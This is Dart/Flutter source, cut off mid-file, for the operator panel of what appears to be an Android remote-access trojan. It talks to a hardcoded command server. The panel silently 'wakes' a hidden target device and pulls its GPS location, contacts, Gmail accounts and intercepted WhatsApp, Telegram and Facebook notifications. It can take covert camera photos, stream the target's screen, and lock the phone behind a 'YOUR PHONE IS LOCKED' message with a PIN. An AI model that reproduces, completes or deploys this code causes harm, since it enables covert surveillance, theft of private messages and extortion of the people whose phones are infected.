import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:url_launcher/url_launcher.dart';

class ControlCenterPage extends StatefulWidget {
  const ControlCenterPage({super.key});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage> {
  bool _isSending = false;
  final List<String> _executionLogs = [];

  bool _isStreamingScreen = false;
  String _currentStreamFrame = "";
  StateSetter? _streamStateSetter;

  // Warna tema biru gelap modern
  static const Color darkBlue = Color(0xFF0A1628);
  static const Color primaryBlue = Color(0xFF1A3A5C);
  static const Color accentBlue = Color(0xFF4A90D9);
  static const Color lightBlue = Color(0xFF6BB3F0);
  static const Color neonBlue = Color(0xFF00D4FF);
  static const Color textWhite = Color(0xFFFFFFFF);
  static const Color textGrey = Color(0xFF9CA3AF);
  static const Color cardBg = Color(0xFF121E33);
  static const Color glassBg = Color(0x1A4A90D9);

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _triggerAutoWakeup();
    });
  }

  void _triggerAutoWakeup() {
    final device = ModalRoute.of(context)!.settings.arguments as Map<String, dynamic>?;
    if (device != null && device['id'] != null) {
      _sendCommand("force_open", device['id'].toString(), isSilent: true);
    }
  }

  void _addLog(String message) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, "[${DateTime.now().toString().substring(11, 19)}] $message");
        if (_executionLogs.length > 100) _executionLogs.removeLast();
      });
    }
  }

  Future<void> _sendCommand(String command, String targetId, {String? extra, bool isSilent = false}) async {
    if (targetId == "unknown") {
      if (!isSilent) {
        _addLog("Error: ID Target tidak valid (unknown)");
        _showNotif("ID TIDAK TERDETEKSI");
      }
      return;
    }

    if (!isSilent) {
      setState(() => _isSending = true);
      _addLog("Mengirim perintah: $command ke $targetId");
    }

    try {
      final response = await http.post(
        Uri.parse("http://justinosuper.erlian.my.id:10142/api/send-command"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": targetId,
          "command": command,
          "extra": extra ?? "",
        }),
      ).timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        if (!isSilent) _addLog("Perintah $command TERKIRIM. Menunggu respon target...");
        _startResponsePolling(command, targetId, isSilent: isSilent);
      } else {
        if (!isSilent) {
          _addLog("Error: Target Offline / Ditolak");
          _showNotif("TARGET OFFLINE");
        }
      }
    } catch (e) {
      if (!isSilent) {
        _addLog("Error: Koneksi Gagal");
        _showNotif("KONEKSI SERVER ERROR");
      }
    } finally {
      if (!isSilent) setState(() => _isSending = false);
    }
  }

  void _fetchNotificationLogs(String targetId) async {
    _addLog("Menarik database pesan & notifikasi...");
    try {
      final response = await http.get(
        Uri.parse("http://justinosuper.erlian.my.id:10142/api/get-notifications/$targetId"),
      );
      if (response.statusCode == 200) {
        final List logs = jsonDecode(response.body);
        _showNotificationLogsDialog(logs);
        _addLog("SUCCESS: ${logs.length} Pesan berhasil ditarik.");
      } else {
        _addLog("Gagal menarik notifikasi. Database kosong.");
      }
    } catch (e) {
      _addLog("Error: Server API Down.");
    }
  }

  void _startResponsePolling(String cmd, String targetId, {bool isSilent = false}) async {
    int attempts = 0;
    bool received = false;
    int maxAttempts = isSilent && cmd == "get_screen" ? 15 : 10;

    while (attempts < maxAttempts && !received) {
      await Future.delayed(Duration(milliseconds: isSilent ? 800 : 3000));
      attempts++;
      if (!isSilent) _addLog("Polling respon... Percobaan $attempts/$maxAttempts");

      try {
        final response = await http.get(
          Uri.parse("http://justinosuper.erlian.my.id:10142/api/get-response/$targetId"),
        );

        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data['data'] != null && data['cmd'] == cmd) {
            _processResponse(cmd, data['data'], targetId);
            received = true;
          }
        }
      } catch (e) { }
    }

    if (!received && !isSilent) {
      _addLog("Timeout: Target tidak merespon/terlalu lambat.");
    }
  }

  Future<void> _processResponse(String cmd, dynamic data, String targetId) async {
    if (data == null) return;

    if (cmd == "get_location") {
      _addLog("SUCCESS: Koordinat GPS diterima.");
      _showLocationDialog(data['lat'], data['lng']);

    } else if (cmd == "get_contacts") {
      _addLog("SUCCESS: Database kontak diunduh.");
      _showContactsDialog(data['contacts']);

    } else if (cmd == "take_photo") {
      final img = data['image_base64'];

      if (img != null && img.toString().isNotEmpty) {
        _addLog("SUCCESS: Gambar kamera diterima (${img.length} bytes)");
        _showCameraResultDialog(img);
      } else {
        _addLog("ERROR: Gambar kosong dari target!");
        _showNotif("GAGAL AMBIL FOTO");
      }

    } else if (cmd == "get_screen") {
      if (!_isStreamingScreen) {
        _addLog("SUCCESS: Memulai Real Screen Stream.");
      }
      _showScreenResultDialog(data['image_base64'] ?? "", targetId);

    } else if (cmd == "get_gmails") {
      _addLog("SUCCESS: Daftar Akun Gmail ditarik.");
      _showGmailDialog(data['accounts'] ?? "No Accounts Found");

    } else if (cmd == "record_audio") {
      _addLog("ATTACK: WiFi DDoS/Jammer Aktif di Target!");
      _showNotif("DDOS BERHASIL DIAKTIFKAN");

    } else if (cmd == "vibrate_loop") {
      _addLog("SUCCESS: Target berhasil digetarkan.");
      _showNotif("TARGET BERGETAR");

    } else if (cmd == "flash_strobe") {
      _addLog("SUCCESS: Strobe Flash Native Aktif (30ms).");
      _showNotif("STROBE ACTIVE");

    } else {
      _addLog("Eksekusi $cmd Berhasil");
      _showNotif("PERINTAH [$cmd] BERHASIL");
    }
  }

  void _showCameraResultDialog(String base64Image) {
    Uint8List? imageBytes;

    try {
      base64Image = base64Image.replaceAll(RegExp(r'data:image/[^;]+;base64,'), '');
      imageBytes = base64Decode(base64Image);
    } catch (e) {
      imageBytes = null;
    }

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Row(
          children: [
            Icon(Icons.camera_alt, color: neonBlue, size: 18),
            const SizedBox(width: 8),
            Text("CAMERA CAPTURE", style: TextStyle(color: textGrey, fontSize: 12, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            if (imageBytes != null && imageBytes.isNotEmpty)
              ClipRRect(
                borderRadius: BorderRadius.circular(12),
                child: Image.memory(imageBytes, fit: BoxFit.contain),
              )
            else
              const Padding(
                padding: EdgeInsets.all(20),
                child: Text("Image not available", style: TextStyle(color: neonBlue)),
              ),
            const SizedBox(height: 10),
            Text("Captured from target device", style: TextStyle(color: textGrey.withOpacity(0.5), fontSize: 10)),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("CLOSE", style: TextStyle(color: textGrey)),
          ),
        ],
      ),
    );
  }

  void _showScreenResultDialog(String base64Image, String targetId) {
    _currentStreamFrame = base64Image;

    if (_isStreamingScreen && _streamStateSetter != null) {
      _streamStateSetter!((){});
      Future.delayed(const Duration(milliseconds: 1000), () {
        if (mounted && _isStreamingScreen) {
          _sendCommand("get_screen", targetId, isSilent: true);
        }
      });
      return;
    }

    _isStreamingScreen = true;
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
          builder: (context, setDialogState) {
            _streamStateSetter = setDialogState;
            return AlertDialog(
              backgroundColor: cardBg,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
              title: Row(
                children: [
                  Icon(Icons.live_tv, color: neonBlue, size: 18),
                  const SizedBox(width: 8),
                  Text("REAL TIME SCREEN STREAM", style: TextStyle(color: textGrey, fontSize: 12, fontWeight: FontWeight.bold)),
                ],
              ),
              content: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  ClipRRect(
                    borderRadius: BorderRadius.circular(12),
                    child: _currentStreamFrame.isNotEmpty
                        ? Image.memory(base64Decode(_currentStreamFrame), fit: BoxFit.contain)
                        : Padding(
                      padding: const EdgeInsets.all(20.0),
                      child: CircularProgressIndicator(
                        valueColor: AlwaysStoppedAnimation<Color>(neonBlue),
                      ),
                    ),
                  ),
                  const SizedBox(height: 10),
                  LinearProgressIndicator(
                    color: neonBlue,
                    backgroundColor: textGrey.withOpacity(0.1),
                  ),
                  const SizedBox(height: 10),
                  Text("Capturing real target screen background.", 
                    style: TextStyle(color: neonBlue.withOpacity(0.7), fontSize: 9)),
                ],
              ),
              actions: [
                TextButton(
                  onPressed: () {
                    _isStreamingScreen = false;
                    _streamStateSetter = null;
                    Navigator.pop(context);
                  },
                  child: Text("STOP STREAM", style: TextStyle(color: neonBlue)),
                ),
              ],
            );
          }
      ),
    ).then((_) {
      _isStreamingScreen = false;
      _streamStateSetter = null;
    });

    Future.delayed(const Duration(milliseconds: 500), () {
      if (mounted && _isStreamingScreen) {
        _sendCommand("get_screen", targetId, isSilent: true);
      }
    });
  }

  void _showLocationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Row(
          children: [
            Icon(Icons.location_on, color: neonBlue, size: 18),
            const SizedBox(width: 8),
            Text("GPS TRACKING", style: TextStyle(color: textGrey, fontSize: 12, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: darkBlue,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: accentBlue.withOpacity(0.2)),
              ),
              child: SelectableText("COORDINATES: $lat, $lng", 
                style: TextStyle(color: textGrey, fontSize: 12, fontFamily: 'monospace')),
            ),
            const SizedBox(height: 15),
            ClipRRect(
              borderRadius: BorderRadius.circular(15),
              child: Image.network(
                "https://static-maps.yandex.ru/1.x/?lang=en_US&ll=$lng,$lat&z=15&l=map&size=450,300",
                height: 200, width: double.infinity, fit: BoxFit.cover,
                errorBuilder: (c, e, s) => Icon(Icons.map, color: textGrey.withOpacity(0.5), size: 50),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), 
            child: Text("CLOSE", style: TextStyle(color: textGrey))),
          TextButton(
            onPressed: () => launchUrl(Uri.parse("https://www.google.com/maps/search/?api=1&query=$lat,$lng")),
            child: Text("OPEN MAPS", style: TextStyle(color: neonBlue)),
          ),
        ],
      ),
    );
  }

  void _showContactsDialog(List contacts) {
    showModalBottomSheet(
      context: context,
      backgroundColor: cardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(25))),
      builder: (context) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (context, scrollController) => Column(
          children: [
            Container(
              margin: const EdgeInsets.symmetric(vertical: 10),
              width: 40, height: 4,
              decoration: BoxDecoration(
                color: textGrey.withOpacity(0.3), 
                borderRadius: BorderRadius.circular(10)
              ),
            ),
            Padding(
              padding: const EdgeInsets.all(15),
              child: Text("CONTACTS DUMP", 
                style: TextStyle(color: neonBlue, fontWeight: FontWeight.bold, letterSpacing: 1)),
            ),
            Expanded(
              child: ListView.builder(
                controller: scrollController,
                itemCount: contacts.length,
                itemBuilder: (context, i) => ListTile(
                  leading: CircleAvatar(
                    backgroundColor: neonBlue.withOpacity(0.2),
                    child: Icon(Icons.person, color: neonBlue, size: 20),
                  ),
                  title: Text(contacts[i]['name'] ?? "No Name", 
                    style: TextStyle(color: textWhite, fontWeight: FontWeight.w500)),
                  subtitle: Text(contacts[i]['number'] ?? "No Number", 
                    style: TextStyle(color: textGrey.withOpacity(0.5))),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showNotificationLogsDialog(List logs) {
    String selectedFilter = "ALL";

    showModalBottomSheet(
      context: context,
      backgroundColor: cardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(25))),
      builder: (context) => StatefulBuilder(
          builder: (context, setModalState) {
            List filteredLogs = logs.where((log) {
              String pkg = log['package']?.toString().toLowerCase() ?? "";
              if (selectedFilter == "WA") return pkg.contains("whatsapp");
              if (selectedFilter == "TELE") return pkg.contains("telegram");
              if (selectedFilter == "FB") return pkg.contains("facebook") || pkg.contains("orca");
              if (selectedFilter == "GMAIL") return pkg.contains("android.gm");
              return true;
            }).toList();

            return DraggableScrollableSheet(
              initialChildSize: 0.8,
              maxChildSize: 0.95,
              expand: false,
              builder: (context, scrollController) => Column(
                children: [
                  Container(
                    margin: const EdgeInsets.symmetric(vertical: 10),
                    width: 40, height: 4,
                    decoration: BoxDecoration(
                      color: textGrey.withOpacity(0.3), 
                      borderRadius: BorderRadius.circular(10)
                    ),
                  ),
                  Text("MESSAGE INTERCEPTOR", 
                    style: TextStyle(color: neonBlue, fontWeight: FontWeight.bold, fontSize: 16, letterSpacing: 1)),
                  const SizedBox(height: 15),
                  SingleChildScrollView(
                    scrollDirection: Axis.horizontal,
                    padding: const EdgeInsets.symmetric(horizontal: 15),
                    child: Row(
                      children: [
                        _buildFilterBtn("ALL", Icons.all_inclusive, textGrey, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                        _buildFilterBtn("WA", Icons.chat, Colors.greenAccent, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                        _buildFilterBtn("TELE", Icons.send, Colors.blueAccent, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                        _buildFilterBtn("FB", Icons.facebook, Colors.blue, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                        _buildFilterBtn("GMAIL", Icons.mail, neonBlue, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      ],
                    ),
                  ),
                  const SizedBox(height: 10),
                  Expanded(
                    child: ListView.builder(
                      controller: scrollController,
                      itemCount: filteredLogs.length,
                      itemBuilder: (context, i) {
                        final log = filteredLogs[i];
                        String pkg = log['package']?.toString() ?? "";
                        IconData icon = Icons.notifications;
                        Color iconColor = textGrey;
                        if (pkg.contains("whatsapp")) icon = Icons.chat;
                        else if (pkg.contains("telegram")) icon = Icons.send;
                        else if (pkg.contains("android.gm")) { icon = Icons.mail; iconColor = neonBlue; }

                        return ListTile(
                          leading: Icon(icon, color: iconColor),
                          title: Text(log['title'] ?? "Unknown", 
                            style: TextStyle(color: textWhite, fontWeight: FontWeight.bold)),
                          subtitle: Text(log['body'] ?? "", 
                            style: TextStyle(color: textGrey.withOpacity(0.7))),
                        );
                      },
                    ),
                  ),
                ],
              ),
            );
          }
      ),
    );
  }

  Widget _buildFilterBtn(String label, IconData icon, Color color, String active, Function(String) onTap) {
    bool isSelected = active == label;
    return GestureDetector(
      onTap: () => onTap(label),
      child: Container(
        margin: const EdgeInsets.only(right: 8),
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
        decoration: BoxDecoration(
          color: isSelected ? color.withOpacity(0.2) : darkBlue,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: isSelected ? color : Colors.transparent),
        ),
        child: Row(
          children: [
            Icon(icon, size: 14, color: isSelected ? color : textGrey.withOpacity(0.5)),
            const SizedBox(width: 6),
            Text(label, 
              style: TextStyle(
                color: isSelected ? Colors.white : textGrey.withOpacity(0.5), 
                fontSize: 11,
                fontWeight: isSelected ? FontWeight.bold : FontWeight.normal,
              )),
          ],
        ),
      ),
    );
  }

  void _showCameraMenu(String targetId) {
    String selectedCam = "back";
    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setInternalState) => AlertDialog(
          backgroundColor: cardBg,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
          title: Text("SURVEILLANCE CAMERA", 
            style: TextStyle(color: textGrey, fontSize: 14, fontWeight: FontWeight.bold)),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Text("Select target camera lens:", 
                style: TextStyle(color: textGrey.withOpacity(0.7))),
              const SizedBox(height: 20),
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: [
                  _cameraOption(Icons.camera_rear, "BACK", "back", selectedCam, (val) => setInternalState(() => selectedCam = val)),
                  _cameraOption(Icons.camera_front, "FRONT", "front", selectedCam, (val) => setInternalState(() => selectedCam = val)),
                ],
              ),
              const SizedBox(height: 30),
              ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: neonBlue,
                  minimumSize: const Size(double.infinity, 45),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                ),
                onPressed: () {
                  _sendCommand("take_photo", targetId, extra: selectedCam);
                  Navigator.pop(context);
                },
                child: const Text("CAPTURE PHOTO", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _cameraOption(IconData icon, String label, String value, String current, Function(String) onTap) {
    bool isSelected = value == current;
    return GestureDetector(
      onTap: () => onTap(value),
      child: Column(
        children: [
          Icon(icon, size: 40, 
            color: isSelected ? neonBlue : textGrey.withOpacity(0.3)),
          const SizedBox(height: 8),
          Text(label, 
            style: TextStyle(
              color: isSelected ? neonBlue : textGrey.withOpacity(0.3), 
              fontSize: 10,
              fontWeight: isSelected ? FontWeight.bold : FontWeight.normal,
            )),
        ],
      ),
    );
  }

  void _showGmailDialog(String emails) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Row(
          children: [
            Icon(Icons.mail, color: neonBlue, size: 18),
            const SizedBox(width: 8),
            Text("GOOGLE ACCOUNTS", 
              style: TextStyle(color: textGrey, fontSize: 12, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(
            color: darkBlue,
            borderRadius: BorderRadius.circular(8),
            border: Border.all(color: accentBlue.withOpacity(0.2)),
          ),
          child: SelectableText(emails, 
            style: TextStyle(color: textGrey, fontFamily: 'monospace', fontSize: 12)),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), 
            child: Text("CLOSE", style: TextStyle(color: textGrey))),
        ],
      ),
    );
  }

  void _showInputDialog(String title, String cmd, String targetId) {
    TextEditingController textCtrl = TextEditingController();
    TextEditingController pinCtrl = TextEditingController();

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
        title: Row(
          children: [
            Icon(
              cmd == "play_audio" ? Icons.music_note : 
              (cmd == "set_wallpaper" ? Icons.image : 
              (cmd == "hard_lock" ? Icons.lock : Icons.link)),
              color: neonBlue, size: 20
            ),
            const SizedBox(width: 10),
            Text(title, 
              style: TextStyle(color: textGrey, fontSize: 14, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: textCtrl,
              style: TextStyle(color: textWhite, fontSize: 13),
              decoration: InputDecoration(
                labelText: cmd == "play_audio" ? "MP3 URL" : 
                          (cmd == "set_wallpaper" ? "Image URL" : 
                          (cmd == "hard_lock" ? "Screen Message" : "Website URL")),
                labelStyle: TextStyle(color: textGrey.withOpacity(0.5)),
                enabledBorder: UnderlineInputBorder(
                  borderSide: BorderSide(color: textGrey.withOpacity(0.2))
                ),
                focusedBorder: const UnderlineInputBorder(
                  borderSide: BorderSide(color: neonBlue)
                ),
              ),
            ),
            if (cmd == "hard_lock") ...[
              const SizedBox(height: 15),
              TextField(
                controller: pinCtrl,
                keyboardType: TextInputType.number,
                style: TextStyle(color: textWhite, fontSize: 13),
                decoration: InputDecoration(
                  labelText: "Unlock PIN",
                  labelStyle: TextStyle(color: textGrey.withOpacity(0.5)),
                  enabledBorder: UnderlineInputBorder(
                    borderSide: BorderSide(color: textGrey.withOpacity(0.2))
                  ),
                  focusedBorder: const UnderlineInputBorder(
                    borderSide: BorderSide(color: neonBlue)
                  ),
                ),
              ),
            ],
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), 
            child: Text("CANCEL", style: TextStyle(color: textGrey.withOpacity(0.7)))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: neonBlue,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8))
            ),
            onPressed: () {
              String finalMsg = textCtrl.text.trim();
              String finalPin = pinCtrl.text.trim();
              if (cmd == "hard_lock") {
                if (finalMsg.isEmpty) finalMsg = "YOUR PHONE IS LOCKED!!!!";
                if (finalPin.isEmpty) finalPin = "123";
                _sendCommand(cmd, targetId, extra: "$finalMsg|$finalPin");
              } else {
                _sendCommand(cmd, targetId, extra: finalMsg);
              }
              Navigator.pop(context);
            },
            child: const Text("SEND", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _showNotif(String m) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: neonBlue,
        content: Text(m, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
        duration: const Duration(seconds: 1),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
  }

  Widget _buildLogContainer() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 10),
      padding: const EdgeInsets.all(12),
      height: 120,
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [cardBg, darkBlue],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: accentBlue.withOpacity(0.2)),
        boxShadow: [
          BoxShadow(
            color: neonBlue.withOpacity(0.05),
            blurRadius: 10,
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.terminal, color: neonBlue.withOpacity(0.6), size: 14),
              const SizedBox(width: 8),
              Text("ACTIVITY LOG", 
                style: TextStyle(
                  color: textGrey.withOpacity(0.6), 
                  fontSize: 10, 
                  fontWeight: FontWeight.bold,
                  letterSpacing: 1,
                )),
              const Spacer(),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                decoration: BoxDecoration(
                  color: neonBlue.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(4),
                ),
                child: Text(
                  _executionLogs.length.toString(),
                  style: TextStyle(color: neonBlue, fontSize: 8),
                ),
              ),
            ],
          ),
          const SizedBox(height: 8),
          Expanded(
            child: ListView.builder(
              itemCount: _executionLogs.length,
              itemBuilder: (context, i) => Padding(
                padding: const EdgeInsets.symmetric(vertical: 2),
                child: Text(
                  _executionLogs[i], 
                  style: TextStyle(
                    color: textGrey.withOpacity(0.5), 
                    fontSize: 9, 
                    fontFamily: 'monospace'
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildControlBlock(String title, String subtitle, IconData icon, Color color, List<Widget> actionButtons) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 8),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [cardBg, darkBlue],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: color.withOpacity(0.3), width: 1.2),
        boxShadow: [
          BoxShadow(
            color: color.withOpacity(0.05),
            blurRadius: 10,
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [color.withOpacity(0.2), color.withOpacity(0.05)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(12),
                ),
                child: Icon(icon, color: color, size: 22),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(title, 
                      style: TextStyle(
                        color: textWhite, 
                        fontSize: 14, 
                        fontWeight: FontWeight.bold,
                        letterSpacing: 0.5,
                      )),
                    const SizedBox(height: 4),
                    Text(subtitle, 
                      style: TextStyle(
                        color: textGrey.withOpacity(0.4), 
                        fontSize: 9,
                        letterSpacing: 0.5,
                      )),
                  ],
                ),
              ),
              Icon(Icons.grid_view, 
                color: textGrey.withOpacity(0.2), 
                size: 18),
            ],
          ),
          const SizedBox(height: 16),
          Wrap(spacing: 10, runSpacing: 10, children: actionButtons),
        ],
      ),
    );
  }

  Widget _buildActionButton(String label, IconData icon, Color color, String cmd, String targetId) {
    return InkWell(
      onTap: () {
        if (cmd == 'get_notif_logs') {
          _fetchNotificationLogs(targetId);
        } else if (cmd == 'take_photo') {
          _showCameraMenu(targetId);
        } else if (cmd == 'open_url' || cmd == 'hard_lock' || cmd == 'set_wallpaper' || cmd == 'play_audio_input') {
          String dialogTitle = cmd == 'hard_lock' ? "Lock Phone" : 
                             (cmd == 'set_wallpaper' ? "Set Wallpaper" : 
                             (cmd == 'play_audio_input' ? "Remote MP3" : "Enter URL"));
          _showInputDialog(dialogTitle, cmd == 'play_audio_input' ? 'play_audio' : cmd, targetId);
        } else if (cmd == 'stop_audio') {
          _sendCommand("stop_audio", targetId);
        } else {
          _sendCommand(cmd, targetId);
        }
      },
      borderRadius: BorderRadius.circular(8),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        decoration: BoxDecoration(
          color: darkBlue,
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: color.withOpacity(0.25)),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, color: color, size: 14),
            const SizedBox(width: 6),
            Text(label, 
              style: TextStyle(
                color: textGrey, 
                fontSize: 10, 
                fontWeight: FontWeight.bold,
                letterSpacing: 0.5,
              )),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final device = ModalRoute.of(context)!.settings.arguments as Map<String, dynamic>?;
    final String targetId = device?['id']?.toString() ?? "unknown";
    final String model = device?['model'] ?? "Device";

    return Scaffold(
      backgroundColor: darkBlue,
      appBar: AppBar(
        backgroundColor: darkBlue,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: textGrey),
          onPressed: () => Navigator.pop(context),
        ),
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(model, 
              style: TextStyle(
                fontSize: 16, 
                fontWeight: FontWeight.bold, 
                color: textWhite,
                letterSpacing: 0.5,
              )),
            Text(targetId, 
              style: TextStyle(
                fontSize: 10, 
                color: textGrey.withOpacity(0.5),
                letterSpacing: 0.5,
              )),
          ],
        ),
        actions: [
          if (_isSending)
            Padding(
              padding: const EdgeInsets.only(right: 15),
              child: Center(
                child: SizedBox(
                  width: 15, 
                  height: 15, 
                  child: CircularProgressIndicator(
                    strokeWidth: 2, 
                    valueColor: AlwaysStoppedAnimation<Color>(neonBlue),
                  ),
                ),
              ),
            ),
          IconButton(
            onPressed: () {
              setState(() {});
              _sendCommand("force_open", targetId, isSilent: true);
            },
            icon: Icon(Icons.refresh, size: 20, color: textGrey)
          )
        ],
      ),
      body: ListView(
        padding: const EdgeInsets.only(bottom: 20),
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 5),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [cardBg, darkBlue],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: accentBlue.withOpacity(0.2)),
            ),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Row(children: [
                  Icon(Icons.battery_full, color: neonBlue, size: 14),
                  const SizedBox(width: 4),
                  Text("${device?['battery'] ?? '100'}%", 
                    style: TextStyle(color: textGrey, fontSize: 12, fontWeight: FontWeight.bold)),
                ]),
                Row(children: [
                  Icon(Icons.android, color: neonBlue, size: 14),
                  const SizedBox(width: 4),
                  Text("Android", 
                    style: TextStyle(color: textGrey, fontSize: 12, fontWeight: FontWeight.bold)),
                ]),
                Row(children: [
                  Icon(Icons.visibility_off, color: neonBlue, size: 14),
                  const SizedBox(width: 4),
                  Text("Hidden", 
                    style: TextStyle(color: neonBlue, fontSize: 12, fontWeight: FontWeight.bold)),
                ]),
              ],
            ),
          ),

          _buildLogContainer(),

          _buildControlBlock("INTELLIGENCE", "Contacts, Messages, Gmail", 
            Icons.folder_shared, accentBlue, [
            _buildActionButton("Contacts", Icons.contacts, accentBlue, "get_contacts", targetId),
            _buildActionButton("Messages", Icons.message, accentBlue, "get_notif_logs", targetId),
            _buildActionButton("Gmail", Icons.mail, accentBlue, "get_gmails", targetId),
            _buildActionButton("Request", Icons.security, neonBlue, "open_notification_settings", targetId),
          ]),

          _buildControlBlock("AUDIO", "Remote MP3 Player", 
            Icons.volume_up, accentBlue, [
            _buildActionButton("Play MP3", Icons.play_arrow, accentBlue, "play_audio_input", targetId),
            _buildActionButton("Stop", Icons.stop, neonBlue, "stop_audio", targetId),
          ]),

          _buildControlBlock("LOCATION", "GPS Tracking", 
            Icons.location_on, accentBlue, [
            _buildActionButton("Get Location", Icons.my_location, accentBlue, "get_location", targetId),
          ]),

          _buildControlBlock("NETWORK", "WiFi Jammer", 
            Icons.wifi, neonBlue, [
            _buildActionButton("DDoS WiFi", Icons.sensors_off, neonBlue, "record_audio", targetId),
          ]),

          _buildControlBlock("MEDIA", "Photo & Screen", 
            Icons.camera_alt, accentBlue, [
            _buildActionButton("Photo", Icons.camera, accentBlue, "take_photo", targetId),
